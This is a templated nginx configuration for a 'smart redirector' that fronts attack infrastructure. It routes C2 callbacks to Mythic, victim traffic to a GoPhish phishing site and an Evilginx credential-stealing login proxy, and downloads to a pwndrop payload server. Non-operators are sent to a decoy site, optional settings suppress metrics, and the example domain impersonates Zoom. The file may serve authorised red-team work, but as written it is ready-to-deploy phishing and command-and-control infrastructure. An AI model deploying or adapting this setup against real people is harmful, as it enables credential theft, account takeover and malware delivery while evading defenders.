# Aegis Centralized Smart Redirector
# Entry point for all infrastructure traffic

# Operator gating (allowlisted operator source IPs/CIDRs)
# - Operators: forwarded to management/services
# - Everyone else: sent to the decoy site on the redirector
geo $is_operator {
    default 0;
{% for cidr in operator_allowlist | default([]) %}
    {{ cidr }} 1;
{% endfor %}
}

# Upstream definitions (Internal communication)
upstream mythic_backend {
    server {{ groups['mythic'][0] }}:7443;
}

upstream gophish_public_backend {
    server {{ groups['gophish'][0] }}:8080;
}

upstream gophish_admin_backend {
    server {{ groups['gophish'][0] }}:3333;
}

upstream evilginx_backend {
    server {{ groups['evilginx'][0] }}:443;
}

upstream pwndrop_backend {
    server {{ groups['pwndrop'][0] }}:8080;
}

upstream decoy_backend {
    server 127.0.0.1:8080;
}

# 1. Main Decoy / Base Domain (e.g., zoom-meeting.duckdns.org)
server {
    listen 80;
    listen 443 ssl;
    server_name {{ base_domain }};

    ssl_certificate /etc/letsencrypt/live/{{ base_domain }}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;

{% if stealth_level | default('high') != 'low' %}
    include /etc/nginx/snippets/aegis-disable-metrics.conf;
{% endif %}

    location / {
        # Host the decoy container locally on the redirector
        proxy_pass http://localhost:8080; 
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        add_header X-Aegis-Filter "Decoy-Frontend";
    }
}

# 2. C2 Redirector (api.*)
server {
    listen 443 ssl;
    server_name {{ c2_domain }};

    ssl_certificate /etc/letsencrypt/live/{{ base_domain }}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;

{% if stealth_level | default('high') != 'low' %}
    include /etc/nginx/snippets/aegis-disable-metrics.conf;
{% endif %}

    # Mythic C2 Callback Paths
    location ~ ^({{ mythic_callback_paths | join('|') }}) {
        proxy_pass https://mythic_backend;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        add_header X-Aegis-Filter "C2-Access";
    }

    # Everything else on api.* goes to decoy
    location / {
        proxy_pass http://localhost:8080;
        add_header X-Aegis-Filter "C2-Blocked";
    }
}

# 3. Phishing Entry (mail.*)
server {
    listen 443 ssl;
    server_name {{ mail_domain }};

    ssl_certificate /etc/letsencrypt/live/{{ base_domain }}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;

{% if stealth_level | default('high') != 'low' %}
    include /etc/nginx/snippets/aegis-disable-metrics.conf;
{% endif %}

    location / {
        # Public phishing site entry (victim traffic)
        proxy_pass http://gophish_public_backend;
        proxy_set_header Host $host;
        add_header X-Aegis-Filter "Phish-Entry";
    }
}

# 4. Login Landing (login.*)
server {
    listen 443 ssl;
    server_name {{ login_domain }};

    ssl_certificate /etc/letsencrypt/live/{{ base_domain }}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;

{% if stealth_level | default('high') != 'low' %}
    include /etc/nginx/snippets/aegis-disable-metrics.conf;
{% endif %}

    location / {
        # Operational domain (victim traffic)
        proxy_pass https://evilginx_backend;
        proxy_set_header Host $host;
        proxy_ssl_verify off; # Evilginx uses its own certs
        add_header X-Aegis-Filter "Login-Landing";
    }
}

# 5. Payload Delivery (cdn.*)
server {
    listen 443 ssl;
    server_name {{ cdn_domain }};

    ssl_certificate /etc/letsencrypt/live/{{ base_domain }}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;

{% if stealth_level | default('high') != 'low' %}
    include /etc/nginx/snippets/aegis-disable-metrics.conf;
{% endif %}

    location / {
        # Operational domain (payload delivery)
        proxy_pass http://pwndrop_backend;
        proxy_set_header Host $host;
        add_header X-Aegis-Filter "Payload-Delivery";
    }
}

# 6. Operator Management Portal (ops.*)
# Operator-only entry point for management UIs.
server {
    listen 443 ssl;
    server_name ops.{{ base_domain }};

    ssl_certificate /etc/letsencrypt/live/{{ base_domain }}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{{ base_domain }}/privkey.pem;

{% if stealth_level | default('high') != 'low' %}
    include /etc/nginx/snippets/aegis-disable-metrics.conf;
{% endif %}

    # Non-operators see decoy
    if ($is_operator = 0) {
        proxy_pass http://decoy_backend;
        break;
    }

    location /mythic/ {
        rewrite ^/mythic/?(.*)$ /$1 break;
        proxy_pass https://mythic_backend;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        add_header X-Aegis-Filter "Ops-Mythic";
    }

    location /gophish/ {
        rewrite ^/gophish/?(.*)$ /$1 break;
        proxy_pass http://gophish_admin_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        add_header X-Aegis-Filter "Ops-GoPhish";
    }

    location /evilginx/ {
        rewrite ^/evilginx/?(.*)$ /$1 break;
        proxy_pass https://evilginx_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_ssl_verify off;
        add_header X-Aegis-Filter "Ops-Evilginx";
    }

    location /pwndrop/ {
        rewrite ^/pwndrop/?(.*)$ /$1 break;
        proxy_pass http://pwndrop_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        add_header X-Aegis-Filter "Ops-Pwndrop";
    }

    location / {
        proxy_pass http://decoy_backend;
        add_header X-Aegis-Filter "Ops-Decoy";
    }
}
